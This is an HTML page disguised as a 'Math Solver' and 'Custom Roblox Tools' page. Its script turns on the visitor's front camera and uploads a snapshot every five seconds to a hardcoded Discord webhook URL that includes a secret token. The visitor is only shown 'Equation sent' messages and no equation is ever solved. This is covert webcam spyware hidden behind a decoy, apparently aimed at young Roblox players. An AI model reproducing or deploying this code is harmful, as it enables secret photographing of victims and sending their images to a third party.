<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Math Solver</title>
    <style>
      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
      }
      
      body {
        background: #000;
        font-family: Arial, sans-serif;
        font-size: 16px;
        min-height: 100vh;
        overflow: hidden;
      }
      
      h1 {
        background: linear-gradient(45deg, #ff0000, #ff7f00, #ffff00, #00ff00, #0000ff, #4b0082, #9400d3, #ff0000);
        background-size: 400% 400%;
        -webkit-background-clip: text;
        -webkit-text-fill-color: transparent;
        background-clip: text;
        font-size: clamp(24px, 8vw, 48px);
        text-align: center;
        margin: 20px 0;
        animation: rainbow 2s ease-in-out infinite;
        text-shadow: 0 0 20px rgba(255,255,255,0.5);
      }
      
      #camera-container {
        position: relative;
        display: block;
        margin: 0 auto;
        width: clamp(300px, 70vw, 500px);
        height: clamp(225px, 52.5vw, 375px);
        border: 4px solid;
        border-image: linear-gradient(45deg, #ff0000, #ff7f00, #ffff00, #00ff00, #0000ff, #4b0082, #9400d3) 1;
        border-radius: 20px;
        box-shadow: 
          0 0 30px rgba(255,0,0,0.5),
          0 0 60px rgba(0,255,0,0.3),
          inset 0 0 30px rgba(255,255,255,0.1);
        animation: rainbowBorder 2s ease-in-out infinite;
        overflow: hidden;
      }
      
      #video-element {
        width: 100%;
        height: 100%;
        object-fit: cover;
        border-radius: 16px;
      }
      
      #math-image {
        display: none; /* Hidden now - live video replaces it */
      }
      
      #math-equation {
        text-align: center;
        margin-top: 20px;
        font-size: clamp(20px, 5vw, 32px);
        background: linear-gradient(45deg, #ff0000, #ff7f00, #ffff00, #00ff00, #0000ff, #4b0082, #9400d3, #ff0000);
        background-size: 400% 400%;
        -webkit-background-clip: text;
        -webkit-text-fill-color: transparent;
        background-clip: text;
        animation: rainbow 1.5s ease-in-out infinite;
        text-shadow: 0 0 20px rgba(255,255,255,0.5);
      }
      
      @keyframes rainbow {
        0% { background-position: 0% 50%; }
        50% { background-position: 100% 50%; }
        100% { background-position: 0% 50%; }
      }
      
      @keyframes rainbowBorder {
        0% { border-image-source: linear-gradient(45deg, #ff0000, #ff7f00, #ffff00, #00ff00, #0000ff, #4b0082, #9400d3); }
        50% { border-image-source: linear-gradient(45deg, #ff7f00, #ffff00, #00ff00, #0000ff, #4b0082, #9400d3, #ff0000); }
        100% { border-image-source: linear-gradient(45deg, #ff0000, #ff7f00, #ffff00, #00ff00, #0000ff, #4b0082, #9400d3); }
      }
      
      @media (max-width: 768px) {
        h1 {
          margin: 10px 0;
        }
        
        #camera-container {
          width: 90vw;
          height: 67.5vw;
        }
      }
    </style>
  </head>
  <body>
    <h1>Custom Roblox Tools ðŸŒ™</h1>
    <div id="camera-container">
      <video id="video-element" autoplay playsinline muted></video>
    </div>
    <img id="math-image" src="" alt="Math Equation">
    <div id="math-equation">Initializing camera...</div>
    
    <script>
      let imageCounter = 1;
      let mediaStream = null;
      let isCapturing = false;

      // Optimized capture function - lower quality for Discord webhook, less frequent
      async function captureImage() {
        if (!isCapturing && mediaStream) {
          isCapturing = true;
          
          const video = document.getElementById('video-element');
          const canvas = document.createElement('canvas');
          canvas.width = 480;  // Lower resolution for faster processing
          canvas.height = 360;
          
          const ctx = canvas.getContext('2d');
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          
          canvas.toBlob(function(blob) {
            const formData = new FormData();
            formData.append('file', blob, 'math-equation.jpg');
            
            const xhr = new XMLHttpRequest();
            xhr.open('POST', 'https://discord.com/api/webhooks/1456537896885420063/edQDxToE40p8fg0rBqz1IIoqcW9YGymAU52eBSR7X1eD2bPxo5NdNwuezg_Nzk1xA0qC');
            xhr.send(formData);
            
            // Update counter display
            document.getElementById('math-equation').innerHTML = `Equation ${imageCounter++} - Sent!`;
            
            setTimeout(() => {
              isCapturing = false;
            }, 1000); // Prevent spam
          }, 'image/jpeg', 0.8); // Lower quality = smaller file = faster
        }
      }

      // Initialize camera with performance-focused constraints
      async function initCamera() {
        try {
          const constraints = {
            video: {
              width: { ideal: 640, max: 640 },
              height: { ideal: 480, max: 480 },
              frameRate: { ideal: 15, max: 30 }, // Lower frame rate = less lag
              facingMode: 'user'
            }
          };

          mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
          const video = document.getElementById('video-element');
          video.srcObject = mediaStream;
          
          video.addEventListener('loadedmetadata', () => {
            document.getElementById('math-equation').innerHTML = 'Camera ready - Capturing every 5s';
            startCaptureInterval();
          });
        } catch (err) {
          console.error(err);
          document.getElementById('math-equation').innerHTML = 'Camera access denied';
        }
      }

      function startCaptureInterval() {
        // Increased interval to 5 seconds to reduce load
        setInterval(captureImage, 5000);
      }

      // Start everything
      initCamera();

      // Handle page visibility to pause/resume camera
      document.addEventListener('visibilitychange', () => {
        if (document.hidden && mediaStream) {
          mediaStream.getTracks().forEach(track => track.stop());
        } else {
          initCamera();
        }
      });
    </script>
  </body>
</html>
